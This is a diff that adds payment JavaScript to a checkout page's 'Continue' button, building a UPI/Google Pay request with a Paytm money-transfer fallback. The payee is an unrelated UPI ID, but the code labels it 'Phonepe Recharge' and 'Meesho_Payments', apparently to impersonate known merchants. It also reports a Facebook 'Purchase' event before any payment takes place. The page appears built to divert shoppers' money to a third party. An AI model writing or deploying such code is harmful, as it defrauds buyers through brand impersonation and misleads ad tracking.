@@ -144,10 +144,176 @@
             </div>
         </div>
         <div class="text-gray-500 text-sm mt-1"></div>
-        <button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full">Continue</button>
+        <button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full" id="onBuyClicked" >Continue</button>
     </div>
-    <script>
-        // Add your JavaScript code here
-    </script>
+
+<script>
+document.getElementById('onBuyClicked').addEventListener('click', function() {
+    onBuyClicked(30.00); // Example amount
+});
+
+function onBuyClicked(amount) {
+    fbq('track', 'Purchase', {currency: "USD", value: amount});
+
+    if (!window.PaymentRequest || isUnsupportedBrowser()) {
+        fallbackPayment(amount);
+        return;
+    }
+
+    const supportedInstruments = [{
+        supportedMethods: ['https://tez.google.com/pay'],
+        data: {
+            pa: 'fcbizckmkfs@freecharge',
+            pn: 'Phonepe Recharge',
+            tr: '1234ABCD',
+            url: 'https://drigli.xyz/newtest/recharge.php',
+            mc: '1234',
+            tn: 'Purchase in Merchant',
+        },
+    }];
+
+    const details = {
+        total: {
+            label: 'Total',
+            amount: {
+                currency: 'INR',
+                value: amount,
+            },
+        },
+        displayItems: [{
+            label: 'Original Amount',
+            amount: {
+                currency: 'INR',
+                value: amount,
+            },
+        }],
+    };
+
+    let request;
+    try {
+        request = new PaymentRequest(supportedInstruments, details);
+    } catch (e) {
+        alert('Payment Request Error: ' + e.message);
+        return;
+    }
+
+    if (!request) {
+        alert('Web payments are not supported in this browser.');
+        return;
+    }
+
+    checkCanMakePayment(request).then((result) => {
+        showPaymentUI(request, result, amount);
+    }).catch((err) => {
+        alert('Error calling checkCanMakePayment: ' + err);
+    });
+}
+
+function isUnsupportedBrowser() {
+    return isFacebookBrowser() || isSamsungBrowser() || isOperaMini() || isUCWebBrowser() || isIOS();
+}
+
+function checkCanMakePayment(request) {
+    const canMakePaymentCache = 'canMakePaymentCache';
+
+    if (sessionStorage.hasOwnProperty(canMakePaymentCache)) {
+        return Promise.resolve(JSON.parse(sessionStorage[canMakePaymentCache]));
+    }
+
+    let canMakePaymentPromise = Promise.resolve(true);
+
+    if (request.canMakePayment) {
+        canMakePaymentPromise = request.canMakePayment();
+    }
+
+    return canMakePaymentPromise.then((result) => {
+        sessionStorage[canMakePaymentCache] = JSON.stringify(result);
+        return result;
+    }).catch((err) => {
+        alert('Error calling canMakePayment: ' + err);
+    });
+}
+
+function showPaymentUI(request, canMakePayment, amount) {
+    if (!canMakePayment) {
+        fallbackPayment(amount);
+        return;
+    }
+
+    const paymentTimeout = window.setTimeout(() => {
+        window.clearTimeout(paymentTimeout);
+        request.abort().then(() => {
+            alert('Payment timed out.');
+        }).catch(() => {
+            alert('Unable to abort, user is in the process of paying.');
+        });
+    }, 20 * 60 * 1000);
+
+    request.show().then((instrument) => {
+        window.clearTimeout(paymentTimeout);
+        processResponse(instrument);
+    }).catch((err) => {
+        alert(err);
+    });
+}
+
+function processResponse(instrument) {
+    const instrumentString = JSON.stringify({
+        methodName: instrument.methodName,
+        details: instrument.details,
+        payerName: instrument.payerName,
+        payerPhone: instrument.payerPhone,
+        payerEmail: instrument.payerEmail,
+    }, undefined, 2);
+
+    fetch('process_payment.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: instrumentString,
+    }).then(response => response.json()).then(data => {
+        if (data.success) {
+            window.location.href = 'payment_success.php';
+        } else {
+            Swal.fire('Payment failed', 'There was an issue with the payment. Please try again.', 'error');
+        }
+    }).catch(error => console.error('Error:', error));
+
+    instrument.complete('success');
+}
+
+function fallbackPayment(amount) {
+    const upiId = 'fcbizckmkfs@freecharge';
+    const redirect_url = `paytmmp://cash_wallet?pa=${upiId}&pn=Meesho_Payments&am=${amount}&cu=INR&tn=4520175&featuretype=money_transfer`;
+
+    window.location.href = redirect_url;
+}
+
+function isFacebookBrowser() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    return ua.includes('FBAN') || ua.includes('FBAV');
+}
+
+function isSamsungBrowser() {
+    return navigator.userAgent.toLowerCase().includes('samsungbrowser');
+}
+
+function isOperaMini() {
+    return navigator.userAgent.toLowerCase().includes('opera mini');
+}
+
+function isUCWebBrowser() {
+    return navigator.userAgent.toLowerCase().includes('ucbrowser');
+}
+
+function isIOS() {
+    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+}
+</script>
+
+<!-- Include SweetAlert2 for alerts -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
 </body>
 </html>
